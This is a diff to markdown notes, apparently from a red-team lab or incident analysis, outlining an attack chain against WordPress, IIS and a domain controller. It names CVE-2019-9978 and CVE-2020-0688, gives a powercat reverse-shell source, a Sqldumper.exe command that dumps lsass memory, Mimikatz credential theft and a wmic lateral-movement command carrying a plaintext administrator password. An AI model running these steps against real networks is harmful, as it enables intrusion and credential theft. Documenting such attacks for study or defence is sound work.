@@ -70,11 +70,11 @@ c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4
 # how attack
 * ubuntu wordpress web server : ```CVE-2019-9978``` to get webshell and ```sqlmap``` to get wropress admin account
 
-* windows IIS server : ```CVE-2020-0688``` (awaiting to determinate) attack then create webshell
+* windows IIS server : ```CVE-2020-0688``` (awaiting to determinate) attack and create reverse shell by [powercat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1)
 
-* windows dc server : in IIS server dump IIS server's lssas.exe and use Minikatz to get dc's admin 's account and password
+* windows dc server : in IIS server execute ```Sqldumper.exe  468 0 0x01100``` dumps the process with pid ```468```(probably ``` lsass.exe```) and use Minikatz to get dc's admin 's account and password (/user:TEAMT5\Administrator /password:admin12345!!!)
 
 # Horizon move
-* ubuntu -> IIS : bt.ext and nt.exe
+* ubuntu -> IIS : post bt.ext and nt.exe by tunnel
 
-* IIS -> dc : create process ipconfig.exe
+* IIS -> dc : create process ipconfig.exe via ```"c:\windows\system32\cmd.exe" /c wmic /node:192.168.1.4 /user:TEAMT5\Administrator /password:admin12345!!! process call create "ipconfig.exe"```
